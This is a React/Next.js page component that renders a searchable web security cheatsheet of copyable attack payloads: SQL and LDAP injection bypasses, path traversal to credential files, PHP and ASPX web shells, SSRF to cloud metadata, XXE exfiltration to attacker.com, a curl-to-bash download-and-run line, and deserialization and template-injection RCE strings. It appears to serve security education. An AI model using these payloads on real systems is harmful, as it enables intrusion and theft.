"use client"

import React, { useState } from 'react';
import Link from 'next/link';
import { Shield, Copy, Check, Search, AlertTriangle, Info, Terminal } from 'lucide-react';
import Footer from '@/components/Footer';

interface CommandSection {
    title: string;
    description: string;
    commands: Array<{
        name: string;
        command: string;
        description: string;
        severity?: 'critical' | 'high' | 'medium' | 'low';
    }>;
}

const WebSecurityCheatsheet = () => {
    const [copiedCommand, setCopiedCommand] = useState<string | null>(null);
    const [searchQuery, setSearchQuery] = useState('');

    const sections: CommandSection[] = [
        {
            title: 'Authentication Bypass',
            description: 'Common authentication bypass techniques',
            commands: [
                {
                    name: 'SQL Auth Bypass',
                    command: "admin' OR '1'='1' --",
                    description: 'Classic SQL injection to bypass login',
                    severity: 'critical'
                },
                {
                    name: 'NoSQL Auth Bypass',
                    command: '{"$ne": null}',
                    description: 'NoSQL injection for MongoDB authentication bypass',
                    severity: 'critical'
                },
                {
                    name: 'JWT None Algorithm',
                    command: '{"alg":"none","typ":"JWT"}',
                    description: 'Modify JWT header to bypass signature verification',
                    severity: 'critical'
                },
                {
                    name: 'Session Fixation',
                    command: 'Set-Cookie: PHPSESSID=attacker_session_id',
                    description: 'Force victim to use known session ID',
                    severity: 'high'
                }
            ]
        },
        {
            title: 'Directory Traversal',
            description: 'Path traversal and file inclusion techniques',
            commands: [
                {
                    name: 'Basic Traversal',
                    command: '../../../../../../etc/passwd',
                    description: 'Read sensitive files using relative paths',
                    severity: 'high'
                },
                {
                    name: 'URL Encoding',
                    command: '..%2F..%2F..%2Fetc%2Fpasswd',
                    description: 'Bypass filters using URL encoding',
                    severity: 'high'
                },
                {
                    name: 'Double Encoding',
                    command: '..%252F..%252F..%252Fetc%252Fpasswd',
                    description: 'Double encode to bypass WAF',
                    severity: 'high'
                },
                {
                    name: 'Null Byte',
                    command: '../../etc/passwd%00.jpg',
                    description: 'Null byte injection to bypass extension checks',
                    severity: 'high'
                },
                {
                    name: 'Windows Path',
                    command: '..\\..\\..\\windows\\system32\\config\\sam',
                    description: 'Windows path traversal',
                    severity: 'high'
                }
            ]
        },
        {
            title: 'File Upload Attacks',
            description: 'Malicious file upload bypasses',
            commands: [
                {
                    name: 'PHP Backdoor',
                    command: '<?php system($_GET["cmd"]); ?>',
                    description: 'Simple PHP web shell',
                    severity: 'critical'
                },
                {
                    name: 'Double Extension',
                    command: 'shell.php.jpg',
                    description: 'Bypass extension whitelist',
                    severity: 'high'
                },
                {
                    name: 'Null Byte Upload',
                    command: 'shell.php%00.jpg',
                    description: 'Null byte in filename',
                    severity: 'high'
                },
                {
                    name: 'Magic Bytes',
                    command: 'GIF89a<?php system($_GET["cmd"]); ?>',
                    description: 'Add magic bytes to bypass MIME checks',
                    severity: 'high'
                },
                {
                    name: 'ASPX Webshell',
                    command: '<%@ Page Language="C#" %><% Response.Write(Request.QueryString["cmd"]); %>',
                    description: 'ASP.NET web shell',
                    severity: 'critical'
                }
            ]
        },
        {
            title: 'Server-Side Request Forgery (SSRF)',
            description: 'SSRF payloads and bypass techniques',
            commands: [
                {
                    name: 'Internal Network',
                    command: 'http://127.0.0.1:8080/admin',
                    description: 'Access internal services',
                    severity: 'high'
                },
                {
                    name: 'Localhost Bypass',
                    command: 'http://0.0.0.0/ or http://[::1]/',
                    description: 'Alternative localhost representations',
                    severity: 'high'
                },
                {
                    name: 'Cloud Metadata',
                    command: 'http://169.254.169.254/latest/meta-data/',
                    description: 'AWS metadata endpoint',
                    severity: 'critical'
                },
                {
                    name: 'URL Encoding Bypass',
                    command: 'http://127.0.0.1@example.com',
                    description: 'Bypass blacklist with URL tricks',
                    severity: 'high'
                },
                {
                    name: 'DNS Rebinding',
                    command: 'http://rebind.example.com',
                    description: 'DNS rebinding attack',
                    severity: 'high'
                }
            ]
        },
        {
            title: 'XML External Entity (XXE)',
            description: 'XXE injection payloads',
            commands: [
                {
                    name: 'Basic XXE',
                    command: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
                    description: 'Read local files via XXE',
                    severity: 'critical'
                },
                {
                    name: 'Blind XXE',
                    command: '<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://attacker.com/?x=%file;\'>">',
                    description: 'Exfiltrate data via out-of-band',
                    severity: 'critical'
                },
                {
                    name: 'XXE via SVG',
                    command: '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><text>&xxe;</text></svg>',
                    description: 'XXE through SVG upload',
                    severity: 'high'
                },
                {
                    name: 'Parameter Entity',
                    command: '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>',
                    description: 'External DTD for XXE',
                    severity: 'high'
                }
            ]
        },
        {
            title: 'Command Injection',
            description: 'OS command injection payloads',
            commands: [
                {
                    name: 'Basic Injection',
                    command: '127.0.0.1; cat /etc/passwd',
                    description: 'Chain commands with semicolon',
                    severity: 'critical'
                },
                {
                    name: 'Pipe Injection',
                    command: '127.0.0.1 | whoami',
                    description: 'Pipe output to command',
                    severity: 'critical'
                },
                {
                    name: 'Logical AND',
                    command: '127.0.0.1 && id',
                    description: 'Execute if previous succeeds',
                    severity: 'critical'
                },
                {
                    name: 'Command Substitution',
                    command: 'ping -c 1 `whoami`.attacker.com',
                    description: 'Backtick command substitution',
                    severity: 'high'
                },
                {
                    name: 'Inline Execution',
                    command: '$(curl attacker.com/shell.sh | bash)',
                    description: 'Download and execute script',
                    severity: 'critical'
                }
            ]
        },
        {
            title: 'Insecure Deserialization',
            description: 'Deserialization attack payloads',
            commands: [
                {
                    name: 'Python Pickle',
                    command: "cos\\nsystem\\n(S'id'\\ntR.",
                    description: 'Python pickle RCE',
                    severity: 'critical'
                },
                {
                    name: 'Java Serialized',
                    command: 'rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==',
                    description: 'Java deserialization gadget',
                    severity: 'critical'
                },
                {
                    name: 'PHP Unserialize',
                    command: 'O:8:"stdClass":1:{s:4:"code";s:10:"phpinfo();";}',
                    description: 'PHP object injection',
                    severity: 'critical'
                },
                {
                    name: 'Node.js Serialize',
                    command: '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'calc\');}()"}',
                    description: 'Node.js deserialization RCE',
                    severity: 'critical'
                }
            ]
        },
        {
            title: 'LDAP Injection',
            description: 'LDAP injection payloads',
            commands: [
                {
                    name: 'Authentication Bypass',
                    command: '*)(uid=*))(|(uid=*',
                    description: 'Bypass LDAP authentication',
                    severity: 'critical'
                },
                {
                    name: 'OR Filter',
                    command: 'admin)(|(password=*)',
                    description: 'LDAP OR injection',
                    severity: 'high'
                },
                {
                    name: 'Blind LDAP',
                    command: '*)(objectClass=*',
                    description: 'Enumerate LDAP objects',
                    severity: 'medium'
                }
            ]
        },
        {
            title: 'Template Injection',
            description: 'Server-Side Template Injection (SSTI)',
            commands: [
                {
                    name: 'Jinja2 RCE',
                    command: "{{ ''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate() }}",
                    description: 'Python Jinja2 template injection',
                    severity: 'critical'
                },
                {
                    name: 'Twig RCE',
                    command: "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
                    description: 'PHP Twig template injection',
                    severity: 'critical'
                },
                {
                    name: 'FreeMarker RCE',
                    command: '<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }',
                    description: 'Java FreeMarker injection',
                    severity: 'critical'
                },
                {
                    name: 'Handlebars RCE',
                    command: "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{/with}}{{/with}}{{/with}}",
                    description: 'Node.js Handlebars injection',
                    severity: 'critical'
                }
            ]
        },
        {
            title: 'Open Redirect',
            description: 'Open redirect payloads',
            commands: [
                {
                    name: 'Basic Redirect',
                    command: '?redirect=https://evil.com',
                    description: 'Direct redirect parameter',
                    severity: 'medium'
                },
                {
                    name: 'Protocol Bypass',
                    command: '?url=//evil.com',
                    description: 'Protocol-relative URL',
                    severity: 'medium'
                },
                {
                    name: 'URL Encoding',
                    command: '?next=%2F%2Fevil.com',
                    description: 'Encoded redirect',
                    severity: 'medium'
                },
                {
                    name: 'JavaScript URI',
                    command: '?redirect=javascript:alert(document.domain)',
                    description: 'JavaScript protocol redirect',
                    severity: 'high'
                }
            ]
        }
    ];

    const copyToClipboard = async (command: string) => {
        await navigator.clipboard.writeText(command);
        setCopiedCommand(command);
        setTimeout(() => setCopiedCommand(null), 2000);
    };

    const getSeverityColor = (severity?: string) => {
        switch (severity) {
            case 'critical': return 'text-red-400 bg-red-500/10 border-red-500/20';
            case 'high': return 'text-orange-400 bg-orange-500/10 border-orange-500/20';
            case 'medium': return 'text-yellow-400 bg-yellow-500/10 border-yellow-500/20';
            case 'low': return 'text-blue-400 bg-blue-500/10 border-blue-500/20';
            default: return 'text-gray-400 bg-gray-500/10 border-gray-500/20';
        }
    };

    const filteredSections = sections.map(section => ({
        ...section,
        commands: section.commands.filter(cmd =>
            cmd.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
            cmd.description.toLowerCase().includes(searchQuery.toLowerCase()) ||
            cmd.command.toLowerCase().includes(searchQuery.toLowerCase())
        )
    })).filter(section => section.commands.length > 0);

    return (
        <div className="min-h-screen bg-black">
            <div className="absolute top-0 left-1/2 -translate-x-1/2 w-[600px] h-[300px] bg-orange-500/10 rounded-full blur-[120px] pointer-events-none" />

            <div className="relative pt-32 pb-16 px-4 sm:px-6">
                <div className="max-w-4xl mx-auto">
                    {/* Header */}
                    <div className="text-center mb-12">
                        <div className="inline-flex items-center gap-2 px-4 py-2 mb-6 rounded-full border border-white/10 bg-white/5">
                            <Shield className="w-4 h-4 text-orange-500" />
                            <span className="text-sm text-gray-400">Web Security</span>
                        </div>

                        <h1 className="text-4xl sm:text-5xl font-bold text-white mb-6">
                            Web Security <span className="text-orange-500">Cheatsheet</span>
                        </h1>

                        <p className="text-lg text-gray-400 max-w-2xl mx-auto mb-8">
                            Comprehensive collection of web application security vulnerabilities and attack vectors
                        </p>

                        {/* Warning */}
                        <div className="flex items-start gap-3 p-4 rounded-xl bg-red-500/10 border border-red-500/20 text-left max-w-2xl mx-auto mb-8">
                            <AlertTriangle className="w-5 h-5 text-red-400 shrink-0 mt-0.5" />
                            <div>
                                <p className="text-sm text-red-400 font-medium mb-1">Educational Purpose Only</p>
                                <p className="text-xs text-red-400/80">
                                    These techniques are for authorized security testing only. Unauthorized access is illegal.
                                </p>
                            </div>
                        </div>

                        {/* Search */}
                        <div className="relative max-w-xl mx-auto">
                            <Search className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-500" />
                            <input
                                type="text"
                                placeholder="Search techniques..."
                                value={searchQuery}
                                onChange={(e) => setSearchQuery(e.target.value)}
                                className="w-full pl-12 pr-4 py-3 bg-white/5 border border-white/10 rounded-xl text-white placeholder:text-gray-500 focus:border-orange-500/50 focus:outline-none transition-colors"
                            />
                        </div>
                    </div>

                    {/* Stats */}
                    <div className="grid grid-cols-2 sm:grid-cols-4 gap-4 mb-12">
                        <div className="p-4 rounded-xl border border-white/10 bg-white/[0.02]">
                            <div className="text-2xl font-bold text-white mb-1">
                                {sections.reduce((acc, s) => acc + s.commands.length, 0)}
                            </div>
                            <div className="text-sm text-gray-400">Total Techniques</div>
                        </div>
                        <div className="p-4 rounded-xl border border-white/10 bg-white/[0.02]">
                            <div className="text-2xl font-bold text-white mb-1">{sections.length}</div>
                            <div className="text-sm text-gray-400">Categories</div>
                        </div>
                        <div className="p-4 rounded-xl border border-white/10 bg-white/[0.02]">
                            <div className="text-2xl font-bold text-red-400 mb-1">
                                {sections.reduce((acc, s) => acc + s.commands.filter(c => c.severity === 'critical').length, 0)}
                            </div>
                            <div className="text-sm text-gray-400">Critical</div>
                        </div>
                        <div className="p-4 rounded-xl border border-white/10 bg-white/[0.02]">
                            <div className="text-2xl font-bold text-orange-400 mb-1">
                                {sections.reduce((acc, s) => acc + s.commands.filter(c => c.severity === 'high').length, 0)}
                            </div>
                            <div className="text-sm text-gray-400">High Risk</div>
                        </div>
                    </div>

                    {/* Sections */}
                    <div className="space-y-8">
                        {filteredSections.map((section, idx) => (
                            <div key={idx} className="rounded-2xl border border-white/10 bg-white/[0.02] p-6 sm:p-8">
                                <div className="flex items-start gap-3 mb-6">
                                    <Terminal className="w-6 h-6 text-orange-500 shrink-0 mt-1" />
                                    <div>
                                        <h2 className="text-xl font-semibold text-white mb-2">{section.title}</h2>
                                        <p className="text-sm text-gray-400">{section.description}</p>
                                    </div>
                                </div>

                                <div className="space-y-3">
                                    {section.commands.map((cmd, cmdIdx) => (
                                        <div
                                            key={cmdIdx}
                                            className="group rounded-xl border border-white/10 bg-white/[0.02] hover:bg-white/[0.04] hover:border-orange-500/30 transition-all p-4"
                                        >
                                            <div className="flex items-start justify-between gap-4 mb-3">
                                                <div className="flex-1">
                                                    <div className="flex items-center gap-3 mb-2">
                                                        <h3 className="font-medium text-white">{cmd.name}</h3>
                                                        {cmd.severity && (
                                                            <span className={`text-xs px-2 py-0.5 rounded border ${getSeverityColor(cmd.severity)}`}>
                                                                {cmd.severity}
                                                            </span>
                                                        )}
                                                    </div>
                                                    <p className="text-sm text-gray-400">{cmd.description}</p>
                                                </div>
                                                <button
                                                    onClick={() => copyToClipboard(cmd.command)}
                                                    className="shrink-0 p-2 rounded-lg border border-white/10 hover:border-orange-500/50 hover:bg-orange-500/10 transition-all"
                                                    title="Copy to clipboard"
                                                >
                                                    {copiedCommand === cmd.command ? (
                                                        <Check className="w-4 h-4 text-green-400" />
                                                    ) : (
                                                        <Copy className="w-4 h-4 text-gray-400 group-hover:text-orange-400" />
                                                    )}
                                                </button>
                                            </div>

                                            <div className="relative">
                                                <pre className="text-sm text-gray-300 bg-black/40 border border-white/10 rounded-lg p-3 overflow-x-auto">
                                                    <code>{cmd.command}</code>
                                                </pre>
                                            </div>
                                        </div>
                                    ))}
                                </div>
                            </div>
                        ))}
                    </div>

                    {/* Info Box */}
                    <div className="mt-12 p-6 rounded-xl border border-blue-500/20 bg-blue-500/5">
                        <div className="flex items-start gap-3">
                            <Info className="w-5 h-5 text-blue-400 shrink-0 mt-0.5" />
                            <div>
                                <p className="text-sm text-blue-400 font-medium mb-2">Need More Resources?</p>
                                <p className="text-sm text-gray-400">
                                    Check out our <a href="/tools" className="text-orange-400 hover:text-orange-300">security tools</a>,{' '}
                                    <a href="/roadmaps" className="text-orange-400 hover:text-orange-300">learning roadmaps</a>, and{' '}
                                    <Link href="/blog" className="text-orange-400 hover:text-orange-300">blog posts</Link> for in-depth tutorials.
                                </p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <Footer />
        </div>
    );
};

export default WebSecurityCheatsheet;
